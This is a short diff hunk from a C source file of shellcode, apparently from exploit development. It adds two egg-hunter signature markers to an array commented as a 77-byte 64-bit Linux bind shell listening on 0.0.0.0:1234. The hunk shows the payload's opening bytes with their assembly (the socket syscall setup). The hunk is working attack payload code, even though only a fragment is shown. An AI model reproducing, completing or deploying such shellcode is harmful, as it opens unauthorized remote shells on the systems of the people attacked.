@@ -103,6 +103,8 @@ char EGG64[] = {
 // 77-byte 64-bit bind shell for linux.  
 // listens on 0.0.0.0:1234
 char BS[] = {
+  EGG_SIG
+  EGG_SIG
   /* 0000 */ "\x6a\x29"                                 /* push 0x29                   */
   /* 0002 */ "\x58"                                     /* pop rax                     */
   /* 0003 */ "\x6a\x01"                                 /* push 0x1                    */
